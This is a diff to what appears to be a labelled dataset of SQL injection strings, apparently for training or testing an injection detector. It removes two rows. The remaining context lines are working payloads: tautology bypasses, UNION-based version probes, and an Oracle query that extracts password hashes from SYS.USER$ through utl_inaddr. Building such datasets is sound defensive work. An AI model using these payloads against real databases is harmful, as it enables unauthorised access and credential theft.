@@ -30,8 +30,6 @@ insert,1
 " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
 " select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
 "or 1  =  1 or """"  =  ",1
-/**/or/**/1/**/  =  /**/1,1
-" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1
 " select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
 " select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
 or 1  =  1/*,1
